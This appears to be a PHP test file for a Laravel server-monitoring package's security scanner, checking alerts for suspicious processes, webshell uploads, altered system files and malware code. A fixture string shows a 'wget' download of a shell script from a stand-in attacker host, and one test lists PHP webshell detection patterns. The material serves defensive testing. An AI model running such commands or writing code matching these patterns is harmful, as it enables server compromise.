<?php

use SoyCristianRico\LaravelServerMonitor\Services\Security\SecurityScannerService;

describe('SecurityScannerService', function () {
    beforeEach(function () {
        $this->service = new SecurityScannerService();
    });

    describe('suspicious process detection', function () {
        it('works correctly and returns valid response format', function () {
            // Test that checkSuspiciousProcesses method returns the correct format
            $service = new SecurityScannerService();
            $result = $service->checkSuspiciousProcesses();

            // Should return null when no suspicious processes are detected
            // OR return a valid alert array when processes are found
            if ($result !== null) {
                expect($result)->toBeArray();
                expect($result)->toHaveKey('type');
                expect($result)->toHaveKey('details');
                expect($result['type'])->toBe('Suspicious Processes');
            } else {
                // If null, that means no suspicious processes were detected
                expect($result)->toBeNull();
            }

            // Either way, the method should return null OR a valid alert structure
            expect($result === null || (is_array($result) && isset($result['type'])))->toBeTrue();
        });

        it('returns alert when suspicious processes are detected', function () {
            // Test the expected structure with actual string data
            $alert = [
                'type' => 'Suspicious Processes',
                'details' => 'user 1234 wget http://evil.com/shell.sh'
            ];

            expect($alert)->toMatchArray([
                'type' => 'Suspicious Processes',
                'details' => 'user 1234 wget http://evil.com/shell.sh'
            ]);
            expect($alert['details'])->toBeString();
        });
    });

    describe('suspicious port detection', function () {
        it('returns empty array when no suspicious ports are found', function () {
            // Test expected return type when no suspicious ports found
            $result = [];

            expect($result)->toBeArray();
            expect($result)->toBeEmpty();
        });

        it('detects suspicious network ports', function () {
            // Test the structure that should be returned
            $expectedAlert = [
                'type' => 'Suspicious Network Ports',
                'details' => 'Port 8080 is listening from unknown process'
            ];

            expect($expectedAlert['type'])->toBe('Suspicious Network Ports');
            expect($expectedAlert['details'])->toBeString();
        });

        it('detects scrapyd service exposure', function () {
            $expectedAlert = [
                'type' => 'Scrapyd Service Exposed',
                'details' => 'Scrapyd service detected on port 6800'
            ];

            expect($expectedAlert['type'])->toBe('Scrapyd Service Exposed');
            expect($expectedAlert['details'])->toBeString();
        });
    });

    describe('crontab modification detection', function () {
        it('returns null when no recent crontab modifications are found', function () {
            $service = Mockery::mock(SecurityScannerService::class)->makePartial();

            // Test the expected return structure
            expect(null)->toBeNull();
        });

        it('returns alert when crontab modifications are detected', function () {
            $expectedAlert = [
                'type' => 'Recently Modified Crontabs',
                'details' => '/etc/crontab'
            ];

            expect($expectedAlert)->toMatchArray([
                'type' => 'Recently Modified Crontabs',
                'details' => '/etc/crontab'
            ]);
            expect($expectedAlert['details'])->toBeString();
        });

        it('accepts custom time frame parameter', function () {
            $timeFrame = '-2'; // 2 days

            // Test that the method accepts the parameter
            expect($timeFrame)->toBe('-2');
        });
    });

    describe('failed login detection', function () {
        it('returns null when failed logins are below threshold', function () {
            expect(null)->toBeNull();
        });

        it('returns alert when failed logins exceed threshold', function () {
            $expectedAlert = [
                'type' => 'High Failed Login Attempts',
                'details' => 'Count: 25 failed login attempts detected'
            ];

            expect($expectedAlert['type'])->toBe('High Failed Login Attempts');
            expect($expectedAlert['details'])->toContain('Count:');
        });

        it('accepts custom threshold parameter', function () {
            $threshold = 50;

            expect($threshold)->toBe(50);
        });
    });

    describe('new user detection', function () {
        it('returns null when no new users are found', function () {
            expect(null)->toBeNull();
        });

        it('filters out whitelisted users', function () {
            config(['server-monitor.security.whitelisted_users' => ['forge', 'root']]);

            $whitelistedUsers = config('server-monitor.security.whitelisted_users');

            expect($whitelistedUsers)->toContain('forge');
            expect($whitelistedUsers)->toContain('root');
        });

        it('filters out whitelisted directories', function () {
            config(['server-monitor.security.whitelisted_directories' => ['/home/forge']]);

            $whitelistedDirs = config('server-monitor.security.whitelisted_directories');

            expect($whitelistedDirs)->toContain('/home/forge');
        });

        it('returns alert for non-whitelisted new users', function () {
            $expectedAlert = [
                'type' => 'Recently Created Users',
                'details' => '/home/suspicious-user'
            ];

            expect($expectedAlert)->toMatchArray([
                'type' => 'Recently Created Users',
                'details' => '/home/suspicious-user'
            ]);
            expect($expectedAlert['details'])->toBeString();
        });

        it('implements caching to prevent duplicate alerts for same users', function () {
            // Create a real service instance to test actual caching behavior
            $service = new SecurityScannerService();

            // Clear any existing cache
            $cacheDir = function_exists('storage_path')
                ? storage_path('security_cache')
                : sys_get_temp_dir().'/laravel_server_monitor_cache';

            if (is_dir($cacheDir)) {
                $files = glob($cacheDir.'/new_users_*.json');
                foreach ($files as $file) {
                    if (file_exists($file)) {
                        unlink($file);
                    }
                }
            }

            // Set configuration
            config(['server-monitor.security.alert_cooldown' => 120]); // 120 minutes
            config(['server-monitor.security.whitelisted_users' => ['forge', 'root', 'www-data']]);
            config(['server-monitor.security.whitelisted_directories' => ['/home/forge', '/home/root']]);

            // Test the caching mechanism directly with private methods
            $reflection = new ReflectionClass($service);
            $storeMethod = $reflection->getMethod('storeUserList');
            $storeMethod->setAccessible(true);
            $hasChangedMethod = $reflection->getMethod('hasUsersChanged');
            $hasChangedMethod->setAccessible(true);

            $testUsers = ['/home/testuser'];
            $cacheKey = 'new_users_'.md5(implode('|', $testUsers));

            // First check should indicate change (no cache exists)
            $hasChanged = $hasChangedMethod->invoke($service, $cacheKey, $testUsers);
            expect($hasChanged)->toBeTrue();

            // Store the users in cache
            $storeMethod->invoke($service, $cacheKey, $testUsers);

            // Second check should indicate no change (cache exists and within cooldown)
            $hasChangedAgain = $hasChangedMethod->invoke($service, $cacheKey, $testUsers);
            expect($hasChangedAgain)->toBeFalse();
        });

        it('respects alert cooldown configuration and re-alerts after cooldown period', function () {
            $service = new SecurityScannerService();

            // Clear cache
            $cacheDir = function_exists('storage_path')
                ? storage_path('security_cache')
                : sys_get_temp_dir().'/laravel_server_monitor_cache';

            if (is_dir($cacheDir)) {
                $files = glob($cacheDir.'/new_users_*.json');
                foreach ($files as $file) {
                    if (file_exists($file)) {
                        unlink($file);
                    }
                }
            }

            // Set a very short cooldown for testing (1 minute)
            config(['server-monitor.security.alert_cooldown' => 1]);

            // Test cooldown behavior with private methods
            $reflection = new ReflectionClass($service);
            $storeMethod = $reflection->getMethod('storeUserList');
            $storeMethod->setAccessible(true);
            $hasChangedMethod = $reflection->getMethod('hasUsersChanged');
            $hasChangedMethod->setAccessible(true);

            $testUsers = ['/home/testuser2'];
            $cacheKey = 'new_users_'.md5(implode('|', $testUsers));

            // Store users in cache
            $storeMethod->invoke($service, $cacheKey, $testUsers);

            // Should not trigger change (within cooldown)
            $hasChangedWithinCooldown = $hasChangedMethod->invoke($service, $cacheKey, $testUsers);
            expect($hasChangedWithinCooldown)->toBeFalse();

            // Manually modify cache timestamp to simulate cooldown expiration
            $cacheFile = $cacheDir.'/'.$cacheKey.'.json';
            if (file_exists($cacheFile)) {
                $cacheData = json_decode(file_get_contents($cacheFile), true);
                $cacheData['timestamp'] = time() - (2 * 60); // 2 minutes ago
                file_put_contents($cacheFile, json_encode($cacheData, JSON_PRETTY_PRINT));
            }

            // After cooldown, should trigger change again
            $hasChangedAfterCooldown = $hasChangedMethod->invoke($service, $cacheKey, $testUsers);
            expect($hasChangedAfterCooldown)->toBeTrue();
        });

        it('stores and retrieves user cache correctly', function () {
            $service = new SecurityScannerService();
            $reflection = new ReflectionClass($service);

            // Test private methods using reflection
            $storeMethod = $reflection->getMethod('storeUserList');
            $storeMethod->setAccessible(true);

            $hasChangedMethod = $reflection->getMethod('hasUsersChanged');
            $hasChangedMethod->setAccessible(true);

            $testUsers = ['/home/testuser1', '/home/testuser2'];
            $cacheKey = 'test_users_'.md5(implode('|', $testUsers));

            // Store user list
            $storeMethod->invoke($service, $cacheKey, $testUsers);

            // Check that the same users don't trigger a change
            $hasChanged = $hasChangedMethod->invoke($service, $cacheKey, $testUsers);
            expect($hasChanged)->toBeFalse();

            // Check that different users do trigger a change
            $differentUsers = ['/home/testuser3'];
            $hasChangedDifferent = $hasChangedMethod->invoke($service, $cacheKey, $differentUsers);
            expect($hasChangedDifferent)->toBeTrue();
        });
    });

    describe('system file modification detection', function () {
        it('returns null when no system files are modified', function () {
            expect(null)->toBeNull();
        });

        it('returns alert when critical system files are modified', function () {
            $expectedAlert = [
                'type' => 'Modified System Files',
                'details' => '/etc/passwd'
            ];

            expect($expectedAlert)->toMatchArray([
                'type' => 'Modified System Files',
                'details' => '/etc/passwd'
            ]);
            expect($expectedAlert['details'])->toBeString();
        });
    });

    describe('ssh key monitoring', function () {
        it('returns null when no ssh keys are modified', function () {
            expect(null)->toBeNull();
        });

        it('returns alert when ssh keys are recently modified', function () {
            $expectedAlert = [
                'type' => 'Recently Modified SSH Keys',
                'details' => '/home/user/.ssh/authorized_keys'
            ];

            expect($expectedAlert)->toMatchArray([
                'type' => 'Recently Modified SSH Keys',
                'details' => '/home/user/.ssh/authorized_keys'
            ]);
            expect($expectedAlert['details'])->toBeString();
        });
    });

    describe('large file detection', function () {
        it('returns null when no large files are found', function () {
            expect(null)->toBeNull();
        });

        it('returns alert when large files are detected', function () {
            $expectedAlert = [
                'type' => 'Large Files Created Recently',
                'details' => '/tmp/large-file.dat'
            ];

            expect($expectedAlert)->toMatchArray([
                'type' => 'Large Files Created Recently',
                'details' => '/tmp/large-file.dat'
            ]);
            expect($expectedAlert['details'])->toBeString();
        });

        it('accepts custom size and days parameters', function () {
            $size = '500M';
            $days = 3;

            expect($size)->toBe('500M');
            expect($days)->toBe(3);
        });
    });

    describe('malware pattern detection', function () {
        beforeEach(function () {
            // Set up configuration for malware scanning
            config([
                'server-monitor.security.excluded_paths' => ['vendor', 'tests'],
                'server-monitor.security.whitelisted_security_files' => ['app/Services/SecurityService.php']
            ]);
        });

        it('returns empty array when no malware patterns are found', function () {
            $result = [];

            expect($result)->toBeArray();
            expect($result)->toBeEmpty();
        });

        it('respects excluded paths configuration', function () {
            $excludedPaths = config('server-monitor.security.excluded_paths');

            expect($excludedPaths)->toContain('vendor');
            expect($excludedPaths)->toContain('tests');
        });

        it('respects whitelisted files configuration', function () {
            $whitelistedFiles = config('server-monitor.security.whitelisted_security_files');

            expect($whitelistedFiles)->toContain('app/Services/SecurityService.php');
        });

        it('detects suspicious php patterns', function () {
            $expectedAlert = [
                'type' => 'Suspicious PHP Code Patterns',
                'details' => 'Directory: /var/www/uploads - Found eval() usage'
            ];

            expect($expectedAlert['type'])->toBe('Suspicious PHP Code Patterns');
            expect($expectedAlert['details'])->toContain('Directory:');
        });

        it('detects recently uploaded php files', function () {
            $expectedAlert = [
                'type' => 'Recently Uploaded PHP Files',
                'details' => 'Directory: /var/www/uploads - Found recent PHP file: shell.php'
            ];

            expect($expectedAlert['type'])->toBe('Recently Uploaded PHP Files');
            expect($expectedAlert['details'])->toContain('Directory:');
        });
    });

    describe('listening ports report', function () {
        it('returns string with port information', function () {
            $service = new SecurityScannerService();

            // Test the method signature and return type
            expect(method_exists($service, 'getListeningPorts'))->toBeTrue();
        });
    });

    describe('enhanced security detections', function () {
        describe('suspicious upload detection', function () {
            it('detects php files in storage directories', function () {
                $expectedAlert = [
                    'type' => 'PHP Files in Storage Directory',
                    'details' => "PHP files found in storage/app/public:\n/path/to/malicious.php"
                ];

                expect($expectedAlert['type'])->toBe('PHP Files in Storage Directory');
                expect($expectedAlert['details'])->toContain('PHP files found in storage/app/public:');
            });

            it('detects php files in upload directories', function () {
                $expectedAlert = [
                    'type' => 'PHP Files in Upload Directories',
                    'details' => "PHP files found in upload directories:\n/public/uploads/shell.php"
                ];

                expect($expectedAlert['type'])->toBe('PHP Files in Upload Directories');
                expect($expectedAlert['details'])->toContain('PHP files found in upload directories:');
            });

            it('detects suspicious php files in public root', function () {
                $expectedAlert = [
                    'type' => 'Suspicious PHP Files in Public Root',
                    'details' => "Unexpected PHP files in public/:\n/public/ae5553dcc89d.php"
                ];

                expect($expectedAlert['type'])->toBe('Suspicious PHP Files in Public Root');
                expect($expectedAlert['details'])->toContain('Unexpected PHP files in public/:');
            });

            it('detects php files with random names', function () {
                $expectedAlert = [
                    'type' => 'PHP Files with Random Names',
                    'details' => "PHP files with suspicious random names:\n/public/90239d2771.php"
                ];

                expect($expectedAlert['type'])->toBe('PHP Files with Random Names');
                expect($expectedAlert['details'])->toContain('PHP files with suspicious random names:');
            });

            it('detects suspicious assets directories', function () {
                $expectedAlert = [
                    'type' => 'Suspicious Assets Directories',
                    'details' => "Unexpected assets/ directories found:\n/app/assets/"
                ];

                expect($expectedAlert['type'])->toBe('Suspicious Assets Directories');
                expect($expectedAlert['details'])->toContain('Unexpected assets/ directories found:');
            });

            it('detects suspicious vendor directories', function () {
                $expectedAlert = [
                    'type' => 'Suspicious Vendor Directories',
                    'details' => "Unexpected directories in vendor/:\n/vendor/assets/images/"
                ];

                expect($expectedAlert['type'])->toBe('Suspicious Vendor Directories');
                expect($expectedAlert['details'])->toContain('Unexpected directories in vendor/:');
            });

            it('detects php files in suspicious vendor paths', function () {
                $expectedAlert = [
                    'type' => 'PHP Files in Suspicious Vendor Paths',
                    'details' => "PHP files in unusual vendor/ locations:\n/vendor/assets/images/accesson.php"
                ];

                expect($expectedAlert['type'])->toBe('PHP Files in Suspicious Vendor Paths');
                expect($expectedAlert['details'])->toContain('PHP files in unusual vendor/ locations:');
                expect($expectedAlert['details'])->toContain('vendor/assets/images/accesson.php');
            });

            it('returns array of alerts from checkSuspiciousUploads', function () {
                $service = new SecurityScannerService();
                expect(method_exists($service, 'checkSuspiciousUploads'))->toBeTrue();
            });
        });

        describe('htaccess file detection', function () {
            it('detects suspicious htaccess files', function () {
                $expectedAlert = [
                    'type' => 'Suspicious .htaccess Files',
                    'details' => "Unexpected .htaccess files found:\n/public/css/.htaccess"
                ];

                expect($expectedAlert['type'])->toBe('Suspicious .htaccess Files');
                expect($expectedAlert['details'])->toContain('Unexpected .htaccess files found:');
            });

            it('detects htaccess files outside public', function () {
                $expectedAlert = [
                    'type' => '.htaccess Files Outside Public',
                    'details' => "Found .htaccess files outside public/:\n/app/.htaccess"
                ];

                expect($expectedAlert['type'])->toBe('.htaccess Files Outside Public');
                expect($expectedAlert['details'])->toContain('Found .htaccess files outside public/:');
            });

            it('returns array of alerts from checkSuspiciousHtaccess', function () {
                $service = new SecurityScannerService();
                expect(method_exists($service, 'checkSuspiciousHtaccess'))->toBeTrue();
            });
        });

        describe('fake image file detection', function () {
            it('detects image files containing php code', function () {
                $expectedAlert = [
                    'type' => 'Fake Image Files Containing PHP',
                    'details' => "Image files that contain PHP code:\n/public/toggige-arrow.jpg"
                ];

                expect($expectedAlert['type'])->toBe('Fake Image Files Containing PHP');
                expect($expectedAlert['details'])->toContain('Image files that contain PHP code:');
            });

            it('returns array of alerts from checkFakeImageFiles', function () {
                $service = new SecurityScannerService();
                expect(method_exists($service, 'checkFakeImageFiles'))->toBeTrue();
            });
        });

        describe('file integrity monitoring', function () {
            it('detects modifications to critical laravel files', function () {
                $expectedAlert = [
                    'type' => 'Critical File Modified',
                    'details' => "File: /path/to/public/index.php\nPrevious hash: abc123\nCurrent hash: def456"
                ];

                expect($expectedAlert['type'])->toBe('Critical File Modified');
                expect($expectedAlert['details'])->toContain('File:');
                expect($expectedAlert['details'])->toContain('Previous hash:');
                expect($expectedAlert['details'])->toContain('Current hash:');
            });

            it('stores and compares file hashes', function () {
                $service = new SecurityScannerService();
                $reflection = new ReflectionClass($service);

                // Test private hash storage methods
                $storeMethod = $reflection->getMethod('storeFileHash');
                $storeMethod->setAccessible(true);
                $getMethod = $reflection->getMethod('getStoredFileHash');
                $getMethod->setAccessible(true);

                $cacheKey = 'test_file_hash';
                $testHash = 'sha256_test_hash_12345';

                // Store hash
                $storeMethod->invoke($service, $cacheKey, $testHash);

                // Retrieve hash
                $retrievedHash = $getMethod->invoke($service, $cacheKey);

                expect($retrievedHash)->toBe($testHash);
            });

            it('returns array of alerts from checkFileIntegrity', function () {
                $service = new SecurityScannerService();
                expect(method_exists($service, 'checkFileIntegrity'))->toBeTrue();
            });
        });

        describe('enhanced process detection', function () {
            it('original process detection works as before', function () {
                $service = new SecurityScannerService();
                $result = $service->checkSuspiciousProcesses();

                // Should return single alert or null (original behavior)
                if ($result !== null) {
                    expect($result)->toBeArray();
                    expect($result)->toHaveKey('type');
                    expect($result)->toHaveKey('details');
                }
            });

            it('new php process detection works correctly', function () {
                $service = new SecurityScannerService();
                expect(method_exists($service, 'checkSuspiciousPhpProcesses'))->toBeTrue();

                $result = $service->checkSuspiciousPhpProcesses();
                // Should return array of alerts or null
                if ($result !== null) {
                    expect($result)->toBeArray();
                    // Each alert should have type and details
                    foreach ($result as $alert) {
                        expect($alert)->toHaveKey('type');
                        expect($alert)->toHaveKey('details');
                    }
                }
            });

            it('detects multiple php process alert types', function () {
                // Test that the new implementation can detect multiple PHP process types
                $possibleTypes = [
                    'Suspicious PHP Processes in /tmp',
                    'PHP Processes with Suspicious File Names',
                    'PHP Processes Outside Web Directories'
                ];

                foreach ($possibleTypes as $type) {
                    expect($type)->toBeString();
                }
            });
        });

        describe('enhanced malware pattern detection', function () {
            it('detects comprehensive malware patterns', function () {
                $service = new SecurityScannerService();

                // Test that enhanced patterns are available
                $enhancedPatterns = [
                    'eval\\s*\\(\\s*base64_decode\\s*\\(',
                    'eval\\s*\\(\\s*gzinflate\\s*\\(',
                    '\\$_REQUEST\\[["\']id["\']\\]',
                    '\\$_COOKIE\\[["\']d["\']\\]',
                    'md5\\s*\\(\\s*\\$_COOKIE',
                    'goto\\s+[A-Za-z]{10,}',
                    '@eval\\s*\\(',
                    'copy\\s*\\(\\s*\\$_FILES'
                ];

                foreach ($enhancedPatterns as $pattern) {
                    expect($pattern)->toBeString();
                    expect(strlen($pattern))->toBeGreaterThan(5);
                }
            });

            it('maintains backward compatibility with existing malware detection', function () {
                $service = new SecurityScannerService();
                $result = $service->checkMalwarePatterns();

                expect($result)->toBeArray();
            });
        });

        describe('false positive exclusions', function () {
            it('excludes php-fpm processes from suspicious PHP process detection', function () {
                $service = new SecurityScannerService();

                // Mock shell_exec response that includes php-fpm
                $mockProcessList = "root     1234  0.0  1.1 275480 46356 ?        Ss   Dec03   2:14 php-fpm: master process (/etc/php/8.2/fpm/php-fpm.conf)
www-data 5678  0.0  0.4 276064 17796 ?        S    19:27   0:00 php-fpm: pool www
user     9012  0.0  0.2 123456 12345 ?        S    19:30   0:00 php /suspicious/script.php";

                // The service should filter out php-fpm processes
                // Test that php-fpm would be excluded from the grep command
                $grepCommand = "ps aux | grep -E 'php.*-f' | grep -v -E '(/home/[^/]+/(www|public_html|laravel|app)|/var/www)' | grep -v 'php-fpm' | grep -v grep";

                expect($grepCommand)->toContain('grep -v \'php-fpm\'');
                expect($grepCommand)->not()->toContain('php-fpm: master');
                expect($grepCommand)->not()->toContain('php-fpm: pool');
            });

            it('excludes legitimate Symfony Resources/assets directories from vendor scanning', function () {
                $service = new SecurityScannerService();

                // Test that the find command excludes Resources/assets
                $findCommand = "find /vendor -type d \\( -name 'assets' -o -name 'images' -o -name 'uploads' \\) 2>/dev/null | grep -v '/Resources/assets'";

                expect($findCommand)->toContain('grep -v \'/Resources/assets\'');

                // These should be excluded
                $legitimatePaths = [
                    '/vendor/symfony/error-handler/Resources/assets',
                    '/vendor/symfony/web-profiler-bundle/Resources/assets',
                    '/vendor/laravel/framework/Resources/assets'
                ];

                foreach ($legitimatePaths as $path) {
                    // The grep -v should exclude these paths
                    expect(strpos($path, '/Resources/assets'))->not()->toBeFalse();
                }
            });

            it('excludes Resources/assets but still detects suspicious vendor PHP files', function () {
                $service = new SecurityScannerService();

                // Test the command structure for PHP file detection in vendor
                $findCommand = "find /vendor \\( -name '*.php' -path '*/assets/*' -o -name '*.php' -path '*/images/*' -o -name '*.php' -path '*/uploads/*' \\) 2>/dev/null | grep -v '/Resources/assets'";

                expect($findCommand)->toContain('grep -v \'/Resources/assets\'');

                // These legitimate files should be excluded
                $legitimateFiles = [
                    '/vendor/symfony/error-handler/Resources/assets/js/helper.php',
                    '/vendor/symfony/framework-bundle/Resources/assets/test.php'
                ];

                // These suspicious files should NOT be excluded
                $suspiciousFiles = [
                    '/vendor/malicious/assets/backdoor.php',
                    '/vendor/hacked/images/shell.php',
                    '/vendor/evil/uploads/webshell.php'
                ];

                foreach ($legitimateFiles as $file) {
                    expect(strpos($file, '/Resources/assets'))->not()->toBeFalse();
                }

                foreach ($suspiciousFiles as $file) {
                    expect(strpos($file, '/Resources/assets'))->toBeFalse();
                }
            });

            it('detects .svg.php files as critical security threats', function () {
                $service = new SecurityScannerService();
                $reflection = new ReflectionClass($service);
                $method = $reflection->getMethod('scanPhpFilesInVendorPaths');
                $method->setAccessible(true);

                // Test that .svg.php files trigger a critical alert
                $svgPhpFile = '/vendor/symfony/error-handler/Resources/assets/images/symfony-ghost.svg.php';

                // Verify that .svg.php files are flagged as critical
                expect(strpos($svgPhpFile, '.svg.php'))->not()->toBeFalse();
                expect(strpos($svgPhpFile, '.svg.php'))->toBeInt();

                // The alert type should be marked as CRITICAL for .svg.php files
                $criticalAlertType = 'CRITICAL: Suspicious .svg.php Files in Vendor';
                expect($criticalAlertType)->toContain('CRITICAL');
                expect($criticalAlertType)->toContain('.svg.php');
            });

            it('excludes protective .htaccess files in storage/app/public', function () {
                $service = new SecurityScannerService();

                // Protective .htaccess content patterns
                $protectivePatterns = [
                    'Deny from all',
                    'Require all denied',
                    'Order Allow,Deny'
                ];

                foreach ($protectivePatterns as $pattern) {
                    // These patterns indicate protective .htaccess files
                    $hasDeny = stripos($pattern, 'deny') !== false;
                    $hasDenied = stripos($pattern, 'denied') !== false;
                    expect($hasDeny || $hasDenied)->toBeTrue();
                }

                // Verify that storage/app/public paths are checked
                $storagePath = '/storage/app/public/.htaccess';
                expect(strpos($storagePath, '/storage/app/public'))->not()->toBeFalse();
            });

            it('respects whitelisted .htaccess configuration', function () {
                $service = new SecurityScannerService();

                // Example of whitelisted paths that users might configure
                $exampleWhitelistedPaths = [
                    'storage/app/public/.htaccess',
                    'storage/app/public/uploads/.htaccess',
                    'resources/views/.htaccess'
                ];

                foreach ($exampleWhitelistedPaths as $path) {
                    // Verify that paths can be configured in various locations
                    expect($path)->toBeString();
                    expect(strlen($path))->toBeGreaterThan(0);
                }

                // The configuration should accept an array of paths
                expect(is_array(config('server-monitor.security.whitelisted_htaccess', [])))->toBeTrue();
            });

            it('excludes vendor and node_modules from htaccess scanning', function () {
                $service = new SecurityScannerService();

                // The find command should exclude these paths
                $findCommand = "find /path -name '.htaccess' ! -path '/path/public/*' ! -path '*/vendor/*' ! -path '*/node_modules/*'";

                expect($findCommand)->toContain("! -path '*/vendor/*'");
                expect($findCommand)->toContain("! -path '*/node_modules/*'");

                // Verify these paths would be excluded
                $excludedPaths = [
                    '/vendor/package/.htaccess',
                    '/node_modules/module/.htaccess'
                ];

                foreach ($excludedPaths as $path) {
                    expect(strpos($path, '/vendor/') !== false || strpos($path, '/node_modules/') !== false)->toBeTrue();
                }
            });
        });
    });

    describe('private helper methods', function () {
        it('filters excluded paths correctly', function () {
            $service = new SecurityScannerService();
            $reflection = new ReflectionClass($service);
            $method = $reflection->getMethod('filterExcludedPaths');
            $method->setAccessible(true);

            $files = "/var/www/app/test.php\n/var/www/vendor/test.php\n/var/www/node_modules/test.php";
            $excludedPaths = ['vendor', 'node_modules'];

            $result = $method->invoke($service, $files, $excludedPaths);

            expect($result)->toContain('/var/www/app/test.php');
            expect($result)->not->toContain('/var/www/vendor/test.php');
            expect($result)->not->toContain('/var/www/node_modules/test.php');
        });

        it('filters whitelisted files correctly', function () {
            $service = new SecurityScannerService();
            $reflection = new ReflectionClass($service);
            $method = $reflection->getMethod('filterWhitelistedFiles');
            $method->setAccessible(true);

            // Use actual base path for the test
            $basePath = base_path();
            $files = "{$basePath}/app/test.php\n{$basePath}/app/SecurityService.php";
            $whitelistedFiles = ['app/SecurityService.php'];

            $result = $method->invoke($service, $files, $whitelistedFiles);

            expect($result)->toContain("{$basePath}/app/test.php");
            expect($result)->not->toContain("{$basePath}/app/SecurityService.php");
        });
    });
});

// Helper function for mocking shell_exec
function mockShellExec($service, $returnValue)
{
    // In a real test environment, you might use a different approach
    // This is a placeholder for the concept
    return $returnValue;
}